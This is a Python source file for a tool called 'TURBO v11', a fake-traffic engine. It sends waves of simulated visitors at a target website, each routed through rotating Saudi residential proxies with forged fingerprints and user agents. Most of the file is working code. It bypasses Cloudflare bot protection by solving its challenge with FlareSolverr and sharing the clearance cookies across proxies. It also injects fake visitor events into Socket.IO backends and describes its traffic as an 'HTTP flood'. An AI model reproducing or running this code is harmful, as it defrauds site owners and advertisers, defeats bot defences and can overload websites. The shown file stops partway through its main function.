#!/usr/bin/env python3
"""
TURBO v11 - SMART UNIVERSAL TRAFFIC ENGINE
============================================
Auto-detects website protection & tracking:
  Mode A: Socket.IO  → Direct WebSocket connection (fastest)
  Mode B: Cloudflare → Smart cookie sharing (FlareSolverr once + HTTP flood)
  Mode C: Plain HTTP → Direct requests with Saudi proxy (fast)

Smart Cloudflare Bypass:
  1. FlareSolverr solves challenge ONCE → gets cf_clearance cookie + UA
  2. Shares cookies with ALL visitors → each uses different Saudi proxy
  3. If shared cookies fail → auto-fallback to per-proxy cookie generation
  4. Background thread refreshes cookies every 10 minutes

Each visitor:
  - Appears from Saudi Arabia (real proxy IP)
  - Has unique fingerprint (OS, browser, device)
  - Stays ~30s then leaves, replaced by new wave
  - Navigates between pages (realistic behavior)
"""
import threading, time, random, string, sys, json, os, re
import requests
from urllib.parse import urlparse

# ============ CONFIG ============
STATUS_FILE = "/root/visit_status.json"
WAVE_SIZE = int(os.environ.get("WAVE_SIZE", "200"))
WAVE_INTERVAL = int(os.environ.get("WAVE_INTERVAL", "30"))
STAY_TIME = int(os.environ.get("STAY_TIME", "35"))

PROXY_USER = os.environ.get("PROXY_USER", "")
PROXY_PASS = os.environ.get("PROXY_PASS", "")
PROXY_HOST = os.environ.get("PROXY_HOST", "proxy.packetstream.io")
PROXY_PORT = os.environ.get("PROXY_PORT", "31112")

# ============ DATA ============
SA_IP_PREFIXES = [
    "185.70","185.71","185.73","37.224","37.225","37.217",
    "51.235","51.36","82.167","82.197","95.186","95.187",
    "178.87","178.88","144.86","188.50","188.51","188.52",
    "46.151","5.1","5.3","62.149","77.30","89.33",
    "109.68","176.224","213.6","213.7",
]
SA_CITIES = ["Riyadh","Jeddah","Mecca","Medina","Dammam","Khobar","Tabuk","Abha","Taif","Hail","Buraidah","Najran","Jazan","Yanbu",""]
FINGERPRINTS = [
    {"os":"Windows","device":"Desktop","browser":"Chrome"},
    {"os":"Windows","device":"Desktop","browser":"Edge"},
    {"os":"macOS","device":"Desktop","browser":"Safari"},
    {"os":"macOS","device":"Desktop","browser":"Chrome"},
    {"os":"Linux","device":"Mobile","browser":"Chrome"},
    {"os":"iOS","device":"Mobile","browser":"Safari"},
    {"os":"Android","device":"Mobile","browser":"Chrome"},
    {"os":"macOS","device":"Mobile","browser":"Safari"},
    {"os":"iOS","device":"Mobile","browser":"Safari"},
    {"os":"Android","device":"Mobile","browser":"Samsung Internet"},
]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
    "Mozilla/5.0 (Linux; Android 13; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/117.0.0.0 Mobile Safari/537.36",
]

# ============ STATS ============
stats = {
    "success":0,"failed":0,"start_time":0,"target":0,
    "active_visitors":0,"waves_done":0,"total_waves":0,
    "duration_min":0,"mode":"detecting","unique_ips":0,"peak_active":0,
}
lock = threading.Lock()
stop_event = threading.Event()

# ============ CLOUDFLARE COOKIE CACHE ============
cf_cookie_cache = {
    "cookies": {},        # {cookie_name: cookie_value}
    "user_agent": "",     # The UA used to solve the challenge
    "timestamp": 0,       # When cookies were obtained
    "valid": False,       # Whether cookies are valid
    "mode": "shared",     # "shared" or "per_proxy"
    "fail_count": 0,      # How many times shared cookies failed
    "lock": threading.Lock(),
}

# ============ HELPERS ============
def gen_ip():
    p = random.choice(SA_IP_PREFIXES).split(".")
    while len(p) < 4: p.append(str(random.randint(1,254)))
    return ".".join(p)

def gen_api_key():
    return "api_" + "".join(random.choices(string.ascii_lowercase + string.digits, k=10))

def gen_fingerprint():
    fp = random.choice(FINGERPRINTS).copy()
    fp["ip"] = gen_ip()
    fp["country"] = "SA"
    fp["city"] = random.choice(SA_CITIES)
    fp["apiKey"] = gen_api_key()
    return fp

def get_proxy_url():
    if PROXY_USER and PROXY_PASS:
        sess = "".join(random.choices(string.ascii_lowercase+string.digits, k=8))
        return f"http://{PROXY_USER}:{PROXY_PASS}_country-SaudiArabia_session-{sess}@{PROXY_HOST}:{PROXY_PORT}"
    return None

def write_status():
    try:
        e = time.time() - stats["start_time"] if stats["start_time"] else 0
        r = stats["success"] / e * 60 if e > 0 else 0
        p = min((stats["waves_done"]/stats["total_waves"]*100) if stats["total_waves"]>0 else 0, 100)
        with open(STATUS_FILE,"w") as f:
            json.dump({
                "status":"finished" if stats["waves_done"]>=stats["total_waves"] else "running",
                "visits":stats["success"],"errors":stats["failed"],
                "target":stats["target"],"progress":round(p,1),
                "elapsed":round(e,1),"rate":round(r,1),
                "timestamp":int(time.time()),"mode":stats["mode"],
                "active_visitors":stats["active_visitors"],
                "peak_active":stats["peak_active"],
                "waves_done":stats["waves_done"],
                "total_waves":stats["total_waves"],
                "duration_min":stats["duration_min"],
                "unique_ips":stats["unique_ips"],
            },f)
    except: pass

def log_progress():
    with lock:
        total = stats["success"]+stats["failed"]
        if total % 10 == 0 or total <= 5:
            e = time.time()-stats["start_time"]
            r = stats["success"]/e*60 if e>0 else 0
            write_status()
            print(f"  [W{stats['waves_done']}/{stats['total_waves']}] "
                  f"✅{stats['success']} ❌{stats['failed']} | "
                  f"{r:.0f}/min | 👥{stats['active_visitors']} active "
                  f"(peak:{stats['peak_active']}) | "
                  f"🌍{stats['unique_ips']} IPs | mode:{stats['mode']}", flush=True)


# ============ CLOUDFLARE COOKIE SOLVER ============
def solve_cloudflare_once(url, proxy=None):
    """
    Use FlareSolverr to solve Cloudflare challenge ONCE.
    Returns: dict with cookies, user_agent, or None on failure.
    """
    for port in range(8191, 8211):
        try:
            payload = {
                "cmd": "request.get",
                "url": url,
                "maxTimeout": 45000,
            }
            if proxy:
                payload["proxy"] = {"url": proxy}
            
            r = requests.post(f"http://localhost:{port}/v1", json=payload, timeout=50)
            data = r.json()
            
            if data.get("status") == "ok":
                solution = data.get("solution", {})
                cookies_list = solution.get("cookies", [])
                ua = solution.get("userAgent", random.choice(USER_AGENTS))
                html = solution.get("response", "")
                
                # Convert cookies list to dict
                cookies = {}
                for c in cookies_list:
                    cookies[c["name"]] = c["value"]
                
                if cookies:
                    print(f"  🍪 Got {len(cookies)} cookies from FlareSolverr (port {port})", flush=True)
                    return {"cookies": cookies, "user_agent": ua, "html": html, "port": port}
                else:
                    print(f"  ⚠️ FlareSolverr returned no cookies (port {port})", flush=True)
        except Exception as e:
            continue
    
    return None


def refresh_cf_cookies(url):
    """Background thread: refresh Cloudflare cookies every 10 minutes."""
    while not stop_event.is_set():
        # Wait 10 minutes
        for _ in range(600):
            if stop_event.is_set():
                return
            time.sleep(1)
        
        print(f"\n🔄 Refreshing Cloudflare cookies...", flush=True)
        proxy = get_proxy_url() if cf_cookie_cache["mode"] == "shared" else None
        result = solve_cloudflare_once(url, proxy=proxy)
        if result:
            with cf_cookie_cache["lock"]:
                cf_cookie_cache["cookies"] = result["cookies"]
                cf_cookie_cache["user_agent"] = result["user_agent"]
                cf_cookie_cache["timestamp"] = time.time()
                cf_cookie_cache["valid"] = True
            print(f"  ✅ Cookies refreshed successfully", flush=True)
        else:
            print(f"  ⚠️ Cookie refresh failed, using existing cookies", flush=True)


def init_cf_cookies(url):
    """
    Initialize Cloudflare cookies at startup.
    First tries shared mode (one cookie for all), if fails switches to per-proxy.
    """
    print(f"\n🔐 Solving Cloudflare challenge...", flush=True)
    
    # Try with a proxy first (shared mode)
    proxy = get_proxy_url()
    result = solve_cloudflare_once(url, proxy=proxy)
    
    if result:
        with cf_cookie_cache["lock"]:
            cf_cookie_cache["cookies"] = result["cookies"]
            cf_cookie_cache["user_agent"] = result["user_agent"]
            cf_cookie_cache["timestamp"] = time.time()
            cf_cookie_cache["valid"] = True
            cf_cookie_cache["mode"] = "shared"
        
        # Test if shared cookies work with a DIFFERENT proxy
        print(f"  🧪 Testing shared cookies with different proxy...", flush=True)
        test_proxy = get_proxy_url()  # Different session = different IP
        test_ok = test_cf_cookies(url, result["cookies"], result["user_agent"], test_proxy)
        
        if test_ok:
            print(f"  ✅ Shared cookies work! All visitors will use same cookies + different IPs", flush=True)
            print(f"  ⚡ Mode: FAST (200 visitors/wave)", flush=True)
            # Start background refresh thread
            t = threading.Thread(target=refresh_cf_cookies, args=(url,), daemon=True)
            t.start()
            return True
        else:
            print(f"  ⚠️ Shared cookies don't work with different IP", flush=True)
            print(f"  🔄 Switching to per-proxy mode...", flush=True)
            with cf_cookie_cache["lock"]:
                cf_cookie_cache["mode"] = "per_proxy"
            return True
    else:
        print(f"  ❌ Could not solve Cloudflare challenge", flush=True)
        print(f"  ⚠️ Will try FlareSolverr per-visitor (slower)", flush=True)
        with cf_cookie_cache["lock"]:
            cf_cookie_cache["mode"] = "per_proxy"
            cf_cookie_cache["valid"] = False
        return False


def test_cf_cookies(url, cookies, user_agent, proxy=None):
    """Test if Cloudflare cookies work with a specific proxy."""
    try:
        proxies = {"http": proxy, "https": proxy} if proxy else None
        headers = {
            "User-Agent": user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "ar-SA,ar;q=0.9,en;q=0.5",
        }
        r = requests.get(url, headers=headers, cookies=cookies, proxies=proxies, timeout=15, allow_redirects=True)
        # If we get 200 and no Cloudflare challenge page, cookies work
        if r.status_code == 200 and "challenge-platform" not in r.text.lower():
            return True
        return False
    except:
        return False


# ============ DETECTION ============
def detect_site(url, manual_socket=None):
    """
    Smart detection: probe the target URL and determine:
    1. Is there Cloudflare protection?
    2. Is there a Socket.IO backend?
    3. What pages/paths are available?
    Returns: dict with mode, socket_url, pages, etc.
    """
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    result = {
        "mode": "http",
        "socket_url": None,
        "pages": [],
        "has_cloudflare": False,
        "has_socketio": False,
        "register_event": "visitor:register",
        "page_change_event": "visitor:pageChange",
        "connected_event": "successfully-connected",
        "base_url": base,
        "target_url": url,
    }
    
    print(f"\n🔍 Scanning {url}...", flush=True)
    
    # If manual socket URL provided, use it directly
    if manual_socket:
        print(f"  🔌 Manual Socket URL: {manual_socket}", flush=True)
        result["socket_url"] = manual_socket
        result["has_socketio"] = True
        result["mode"] = "socketio"
        result["pages"] = discover_pages(url, base)
        try:
            sio_url = f"{manual_socket}/socket.io/?EIO=4&transport=polling"
            r = requests.get(sio_url, timeout=10)
            if r.status_code == 200 and "sid" in r.text:
                print(f"  ✅ Socket.IO verified at {manual_socket}", flush=True)
            else:
                print(f"  ⚠️ Socket.IO not verified but will try anyway", flush=True)
        except:
            print(f"  ⚠️ Could not verify Socket.IO but will try anyway", flush=True)
        return result
    
    # Step 1: Check for Cloudflare
    html_content = ""
    try:
        proxy = get_proxy_url()
        proxies = {"http": proxy, "https": proxy} if proxy else None
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        r = requests.get(url, headers=headers, proxies=proxies, timeout=15, allow_redirects=True)
        
        cf_headers = ["cf-ray", "cf-cache-status", "cf-mitigated"]
        server = r.headers.get("server", "").lower()
        has_cf = any(h in r.headers for h in cf_headers) or "cloudflare" in server
        
        if has_cf:
            print(f"  ☁️ Cloudflare detected (server: {server})", flush=True)
            result["has_cloudflare"] = True
        
        if r.status_code == 403 or r.status_code == 503:
            print(f"  🛡️ Blocked (status {r.status_code}) - Cloudflare challenge", flush=True)
            result["has_cloudflare"] = True
        
        html_content = r.text
        
        # Check for Socket.IO in accessible page
        if r.status_code == 200:
            if "socket.io" in html_content.lower() or "io(" in html_content:
                print(f"  🔌 Socket.IO found in page source!", flush=True)
                result["has_socketio"] = True
            
            # Try to find socket server URL
            result["socket_url"] = extract_socket_url(html_content)
                
    except requests.exceptions.ProxyError:
        print(f"  ⚠️ Proxy error - trying without proxy", flush=True)
        try:
            r = requests.get(url, headers={"User-Agent": random.choice(USER_AGENTS)}, timeout=15)
            if r.status_code == 403 or "cloudflare" in r.headers.get("server","").lower():
                result["has_cloudflare"] = True
            html_content = r.text
        except:
            result["has_cloudflare"] = True
    except Exception as e:
        print(f"  ⚠️ HTTP probe failed: {e}", flush=True)
        result["has_cloudflare"] = True
    
    # Step 2: Check for Socket.IO endpoint on the same server
    if not result["has_socketio"]:
        try:
            sio_url = f"{base}/socket.io/?EIO=4&transport=polling"
            r2 = requests.get(sio_url, timeout=10)
            if r2.status_code == 200 and "sid" in r2.text:
                result["has_socketio"] = True
                result["socket_url"] = base
                print(f"  🔌 Socket.IO found at {base}", flush=True)
        except:
            pass
    
    # Step 2b: If Cloudflare blocked us, use FlareSolverr to peek behind it
    if result["has_cloudflare"] and not result["has_socketio"]:
        print(f"  🔄 Using FlareSolverr to peek behind Cloudflare...", flush=True)
        flare_result = solve_cloudflare_once(url)
        if flare_result:
            html_behind_cf = flare_result.get("html", "")
            
            # Check for Socket.IO behind Cloudflare
            if "socket.io" in html_behind_cf.lower() or "io(" in html_behind_cf:
                result["has_socketio"] = True
                print(f"  🔌 Socket.IO found behind Cloudflare!", flush=True)
                
                # Extract socket URL from source
                found_url = extract_socket_url(html_behind_cf)
                if found_url:
                    result["socket_url"] = found_url
                
                # Also try to find it on the same server
                if not result["socket_url"]:
                    try:
                        sio_url = f"{base}/socket.io/?EIO=4&transport=polling"
                        cookies = flare_result["cookies"]
                        ua = flare_result["user_agent"]
                        r3 = requests.get(sio_url, cookies=cookies, 
                                         headers={"User-Agent": ua}, timeout=10)
                        if r3.status_code == 200 and "sid" in r3.text:
                            result["socket_url"] = base
                    except:
                        pass
            
            # Save cookies for later use in Cloudflare mode
            with cf_cookie_cache["lock"]:
                cf_cookie_cache["cookies"] = flare_result["cookies"]
                cf_cookie_cache["user_agent"] = flare_result["user_agent"]
                cf_cookie_cache["timestamp"] = time.time()
                cf_cookie_cache["valid"] = True
            
            html_content = html_behind_cf
    
    # Step 3: If socket URL found, verify it
    if result["socket_url"] and not result["has_socketio"]:
        try:
            sio_url = f"{result['socket_url']}/socket.io/?EIO=4&transport=polling"
            r3 = requests.get(sio_url, timeout=10)
            if r3.status_code == 200 and "sid" in r3.text:
                result["has_socketio"] = True
                print(f"  ✅ Socket.IO verified at {result['socket_url']}", flush=True)
        except:
            pass
    
    # Step 4: Determine mode
    if result["has_socketio"]:
        result["mode"] = "socketio"
        if not result["socket_url"]:
            result["socket_url"] = base
    elif result["has_cloudflare"]:
        result["mode"] = "cloudflare"
    else:
        result["mode"] = "http"
    
    # Step 5: Discover pages
    result["pages"] = discover_pages(url, base, html_content)
    
    print(f"\n📋 Detection result:", flush=True)
    print(f"  Mode: {result['mode']}", flush=True)
    print(f"  Socket URL: {result['socket_url']}", flush=True)
    print(f"  Cloudflare: {result['has_cloudflare']}", flush=True)
    print(f"  Pages found: {len(result['pages'])}", flush=True)
    
    return result


def extract_socket_url(html):
    """Extract Socket.IO server URL from HTML source."""
    for pattern in [
        r'(?:const|let|var)\s+\w*(?:SOCKET|socket|server|api|SERVER|API)\w*\s*=\s*[\'"]([^"\']+)[\'"]',
        r'io\([\'"]([^"\']+)[\'"]',
        r'connect\([\'"]([^"\']+)[\'"]',
        r'socketUrl\s*[:=]\s*[\'"]([^"\']+)[\'"]',
        r'SOCKET_URL\s*[:=]\s*[\'"]([^"\']+)[\'"]',
        r'serverUrl\s*[:=]\s*[\'"]([^"\']+)[\'"]',
    ]:
        matches = re.findall(pattern, html)
        for m in matches:
            if m.startswith("http") and "socket.io" not in m and "cdn" not in m.lower():
                print(f"  🔗 Found socket URL: {m}", flush=True)
                return m
    return None


def discover_pages(url, base, html_content=""):
    """Try to find pages/paths from the website."""
    pages = ["/"]
    try:
        proxy = get_proxy_url()
        proxies = {"http": proxy, "https": proxy} if proxy else None
        
        # Try sitemap
        for sitemap_path in ["/sitemap.xml", "/sitemap_index.xml"]:
            try:
                r = requests.get(base + sitemap_path, proxies=proxies, timeout=10,
                               headers={"User-Agent": random.choice(USER_AGENTS)})
                if r.status_code == 200 and "<loc>" in r.text:
                    locs = re.findall(r"<loc>([^<]+)</loc>", r.text)
                    for loc in locs[:20]:
                        path = urlparse(loc).path or "/"
                        if path not in pages:
                            pages.append(path)
            except:
                pass
        
        # Try robots.txt
        try:
            r = requests.get(base + "/robots.txt", proxies=proxies, timeout=10,
                           headers={"User-Agent": random.choice(USER_AGENTS)})
            if r.status_code == 200:
                for line in r.text.split("\n"):
                    if "allow:" in line.lower():
                        path = line.split(":", 1)[1].strip()
                        if path and path != "/" and not path.startswith("*") and path not in pages:
                            pages.append(path)
        except:
            pass
        
        # Extract links from HTML content (either from direct access or FlareSolverr)
        source = html_content
        if not source:
            try:
                r = requests.get(url, proxies=proxies, timeout=15,
                               headers={"User-Agent": random.choice(USER_AGENTS)})
                if r.status_code == 200:
                    source = r.text
            except:
                pass
        
        if source:
            hrefs = re.findall(r'href=["\']([^"\']+)["\']', source)
            for href in hrefs:
                if href.startswith("/") and not href.startswith("//"):
                    if href not in pages and len(pages) < 30:
                        pages.append(href)
                elif href.startswith(base):
                    path = urlparse(href).path or "/"
                    if path not in pages and len(pages) < 30:
                        pages.append(path)
            
    except:
        pass
    
    if len(pages) < 3:
        pages.extend(["/", "/about", "/contact", "/services", "/faq"])
    
    return list(set(pages))[:20]


# ============ MODE A: SOCKET.IO ============
def visitor_socketio(site_info, vid):
    """Connect via Socket.IO through unique Saudi proxy - each visitor has different real IP."""
    try:
        import socketio as sio_lib
    except ImportError:
        os.system("pip3 install 'python-socketio[client]' websocket-client -q 2>/dev/null")
        import socketio as sio_lib
    
    fp = gen_fingerprint()
    fp["page"] = random.choice(site_info["pages"]) if site_info["pages"] else "/"
    
    proxy_url = get_proxy_url()
    http_session = None
    if proxy_url:
        http_session = requests.Session()
        http_session.proxies = {"http": proxy_url, "https": proxy_url}
    
    sio = sio_lib.Client(
        reconnection=False,
        http_session=http_session,
        request_timeout=15,
    )
    connected = threading.Event()
    
    @sio.event
    def connect():
        connected.set()
        sio.emit(site_info["register_event"], fp)
    
    @sio.on(site_info["connected_event"])
    def on_ok(data):
        pass
    
    @sio.on("*")
    def catch_all(event, data):
        pass
    
    @sio.event
    def disconnect():
        pass
    
    try:
        socket_url = site_info["socket_url"]
        sio.connect(socket_url, transports=['websocket','polling'], wait_timeout=15)
        
        if not connected.wait(timeout=10):
            with lock:
                stats["failed"] += 1
            log_progress()
            try: sio.disconnect()
            except: pass
            return False
        
        with lock:
            stats["success"] += 1
            stats["active_visitors"] += 1
            stats["unique_ips"] += 1
            if stats["active_visitors"] > stats["peak_active"]:
                stats["peak_active"] = stats["active_visitors"]
        log_progress()
        
        stay = STAY_TIME + random.randint(-5, 5)
        end_time = time.time() + max(stay, 15)
        
        while time.time() < end_time and not stop_event.is_set():
            time.sleep(random.uniform(5, 10))
            if time.time() >= end_time or stop_event.is_set():
                break
            try:
                new_page = random.choice(site_info["pages"]) if site_info["pages"] else "/"
                sio.emit(site_info["page_change_event"], {"page": new_page})
            except:
                break
        
        try: sio.disconnect()
        except: pass
        
        with lock:
            stats["active_visitors"] -= 1
        return True
        
    except Exception as e:
        with lock:
            stats["failed"] += 1
        log_progress()
        try: sio.disconnect()
        except: pass
        return False


# ============ MODE B: CLOUDFLARE (SMART COOKIE SHARING) ============
def visitor_cloudflare(site_info, vid):
    """
    Smart Cloudflare bypass:
    - Shared mode: Use pre-solved cookies + unique Saudi proxy per visitor (FAST)
    - Per-proxy mode: FlareSolverr per visitor (SLOW fallback)
    """
    url = site_info["target_url"]
    
    with cf_cookie_cache["lock"]:
        mode = cf_cookie_cache["mode"]
        cookies = cf_cookie_cache["cookies"].copy()
        ua = cf_cookie_cache["user_agent"]
        valid = cf_cookie_cache["valid"]
    
    if mode == "shared" and valid and cookies:
        return visitor_cloudflare_shared(site_info, vid, cookies, ua)
    else:
        return visitor_cloudflare_per_proxy(site_info, vid)


def visitor_cloudflare_shared(site_info, vid, cookies, ua):
    """Use shared Cloudflare cookies with unique proxy per visitor - FAST mode."""
    url = site_info["target_url"]
    proxy = get_proxy_url()
    proxies = {"http": proxy, "https": proxy} if proxy else None
    
    headers = {
        "User-Agent": ua,  # Must match the UA used to solve the challenge
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "ar-SA,ar;q=0.9,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Cache-Control": "max-age=0",
    }
    
    try:
        session = requests.Session()
        session.headers.update(headers)
        session.cookies.update(cookies)
        if proxies:
            session.proxies.update(proxies)
        
        r = session.get(url, timeout=15, allow_redirects=True)
        
        # Check if Cloudflare blocked us (cookies didn't work with this IP)
        if r.status_code == 403 or "challenge-platform" in r.text.lower():
            # Shared cookies failed with different IP
            with cf_cookie_cache["lock"]:
                cf_cookie_cache["fail_count"] += 1
                if cf_cookie_cache["fail_count"] >= 3:
                    print(f"  ⚠️ Shared cookies failing, switching to per-proxy mode", flush=True)
                    cf_cookie_cache["mode"] = "per_proxy"
            
            # Fallback to per-proxy for this visitor
            return visitor_cloudflare_per_proxy(site_info, vid)
        
        if r.status_code in [200, 301, 302]:
            with lock:
                stats["success"] += 1
                stats["active_visitors"] += 1
                stats["unique_ips"] += 1
                if stats["active_visitors"] > stats["peak_active"]:
                    stats["peak_active"] = stats["active_visitors"]
            log_progress()
            
            # Simulate browsing
            stay = STAY_TIME + random.randint(-5, 5)
            end_time = time.time() + max(stay, 15)
            
            while time.time() < end_time and not stop_event.is_set():
                time.sleep(random.uniform(3, 8))
                if time.time() >= end_time or stop_event.is_set():
                    break
                page = random.choice(site_info["pages"]) if site_info["pages"] else "/"
                try:
                    session.get(site_info["base_url"] + page, timeout=10)
                except:
                    pass
            
            with lock:
                stats["active_visitors"] -= 1
            return True
        else:
            with lock:
                stats["failed"] += 1
            log_progress()
            return False
            
    except Exception as e:
        with lock:
            stats["failed"] += 1
        log_progress()
        return False


def visitor_cloudflare_per_proxy(site_info, vid):
    """Fallback: Use FlareSolverr per visitor - SLOW but guaranteed."""
    url = site_info["target_url"]
    flare_port = 8191 + (vid % 20)
    flare_url = f"http://localhost:{flare_port}"
    proxy = get_proxy_url()
    
    try:
        payload = {
            "cmd": "request.get",
            "url": url,
            "maxTimeout": 30000,
        }
        if proxy:
            payload["proxy"] = {"url": proxy}
        
        r = requests.post(f"{flare_url}/v1", json=payload, timeout=35)
        data = r.json()
        
        if data.get("status") == "ok":
            with lock:
                stats["success"] += 1
                stats["active_visitors"] += 1
                stats["unique_ips"] += 1
                if stats["active_visitors"] > stats["peak_active"]:
                    stats["peak_active"] = stats["active_visitors"]
            log_progress()
            
            # Get cookies from this solve for future HTTP requests
            solution = data.get("solution", {})
            cookies_list = solution.get("cookies", [])
            ua = solution.get("userAgent", random.choice(USER_AGENTS))
            cookies = {}
            for c in cookies_list:
                cookies[c["name"]] = c["value"]
            
            # Simulate staying on site using HTTP with solved cookies
            stay = STAY_TIME + random.randint(-5, 5)
            end_time = time.time() + max(stay, 15)
            
            while time.time() < end_time and not stop_event.is_set():
                time.sleep(random.uniform(5, 10))
                if time.time() >= end_time or stop_event.is_set():
                    break
                page = random.choice(site_info["pages"]) if site_info["pages"] else "/"
                page_url = site_info["base_url"] + page
                try:
                    proxies = {"http": proxy, "https": proxy} if proxy else None
                    requests.get(page_url, cookies=cookies, 
                               headers={"User-Agent": ua}, proxies=proxies, timeout=10)
                except:
                    pass
            
            with lock:
                stats["active_visitors"] -= 1
            return True
        else:
            with lock:
                stats["failed"] += 1
            log_progress()
            return False
            
    except Exception as e:
        with lock:
            stats["failed"] += 1
        log_progress()
        return False


# ============ MODE C: PLAIN HTTP ============
def visitor_http(site_info, vid):
    """Direct HTTP requests with Saudi proxy - for unprotected sites."""
    url = site_info["target_url"]
    ua = random.choice(USER_AGENTS)
    proxy = get_proxy_url()
    proxies = {"http": proxy, "https": proxy} if proxy else None
    
    headers = {
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "ar-SA,ar;q=0.9,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Cache-Control": "max-age=0",
    }
    
    try:
        session = requests.Session()
        session.headers.update(headers)
        if proxies:
            session.proxies.update(proxies)
        
        r = session.get(url, timeout=15, allow_redirects=True)
        
        if r.status_code in [200, 301, 302]:
            with lock:
                stats["success"] += 1
                stats["active_visitors"] += 1
                stats["unique_ips"] += 1
                if stats["active_visitors"] > stats["peak_active"]:
                    stats["peak_active"] = stats["active_visitors"]
            log_progress()
            
            stay = STAY_TIME + random.randint(-5, 5)
            end_time = time.time() + max(stay, 15)
            
            while time.time() < end_time and not stop_event.is_set():
                time.sleep(random.uniform(3, 8))
                if time.time() >= end_time or stop_event.is_set():
                    break
                page = random.choice(site_info["pages"]) if site_info["pages"] else "/"
                try:
                    session.get(site_info["base_url"] + page, timeout=10)
                except:
                    pass
            
            with lock:
                stats["active_visitors"] -= 1
            return True
        else:
            with lock:
                stats["failed"] += 1
            log_progress()
            return False
            
    except Exception as e:
        with lock:
            stats["failed"] += 1
        log_progress()
        return False


# ============ WAVE ENGINE ============
def visitor_dispatch(site_info, vid):
    """Route to the correct visitor mode."""
    mode = site_info["mode"]
    if mode == "socketio":
        return visitor_socketio(site_info, vid)
    elif mode == "cloudflare":
        return visitor_cloudflare(site_info, vid)
    else:
        return visitor_http(site_info, vid)


def run_wave(wave_num, site_info):
    """Run one wave of WAVE_SIZE visitors."""
    print(f"\n🌊 Wave {wave_num+1}/{stats['total_waves']} - "
          f"Sending {WAVE_SIZE} visitors ({site_info['mode']})...", flush=True)
    
    threads = []
    for i in range(WAVE_SIZE):
        if stop_event.is_set():
            break
        vid = wave_num * WAVE_SIZE + i
        t = threading.Thread(target=visitor_dispatch, args=(site_info, vid), daemon=True)
        t.start()
        threads.append(t)
        time.sleep(0.15)
    
    with lock:
        stats["waves_done"] += 1
    write_status()
    return threads


# ============ MAIN ============
def run(url, duration_min, manual_socket=None):
    # Step 1: Detect site
    site_info = detect_site(url, manual_socket=manual_socket)
    stats["mode"] = site_info["mode"]
    
    # Step 2: Install dependencies if needed
    if site_info["mode"] == "socketio":
        try:
            import socketio
        except ImportError:
            print("📦 Installing python-socketio...", flush=True)
            os.system("pip3 install 'python-socketio[client]' websocket-client -q 2>/dev/null")
            os.system("pip3 install 'python-socketio[client]' websocket-client --break-system-packages -q 2>/dev/null")
    
    # Step 3: Initialize Cloudflare cookies if needed
    if site_info["mode"] == "cloudflare":
        if not cf_cookie_cache["valid"]:
            init_cf_cookies(url)
        cf_mode = cf_cookie_cache["mode"]
        if cf_mode == "shared":
            print(f"  ⚡ Cloudflare mode: SHARED COOKIES (fast - ~200 active/server)", flush=True)
        else:
            print(f"  🐢 Cloudflare mode: PER-PROXY (slower - ~10 active/server)", flush=True)
    
    total_waves = max(1, duration_min * 2)
    total_visits = total_waves * WAVE_SIZE
    
    print(f"\n{'='*60}", flush=True)
    print(f"🚀 TURBO v11 - SMART UNIVERSAL ENGINE", flush=True)
    print(f"Target: {url}", flush=True)
    print(f"Mode: {site_info['mode'].upper()}", flush=True)
    if site_info['socket_url']:
        print(f"Socket: {site_info['socket_url']}", flush=True)
    if site_info['mode'] == 'cloudflare':
        print(f"CF Bypass: {cf_cookie_cache['mode'].upper()}", flush=True)
    print(f"Duration: {duration_min} min | Waves: {total_waves}", flush=True)
    print(f"Visitors/wave: {WAVE_SIZE} | Stay: {STAY_TIME}s", flush=True)
    print(f"Expected: {total_visits} visits | ~{WAVE_SIZE} active", flush=True)
    print(f"Pages: {len(site_info['pages'])}", flush=True)
    print(f"Proxy: {'Yes' if PROXY_USER else 'No'}", flush=True)
    print(f"{'='*60}\n", flush=True)
    
    stats["start_time"] = time.time()
    stats["target"] = total_visits
    stats["total_waves"] = total_waves
    stats["duration_min"] = duration_min
    stats["success"] = 0
    stats["failed"] = 0
    stats["active_visitors"] = 0
    stats["peak_active"] = 0
    stats["waves_done"] = 0
    stats["unique_ips"] = 0
    write_status()
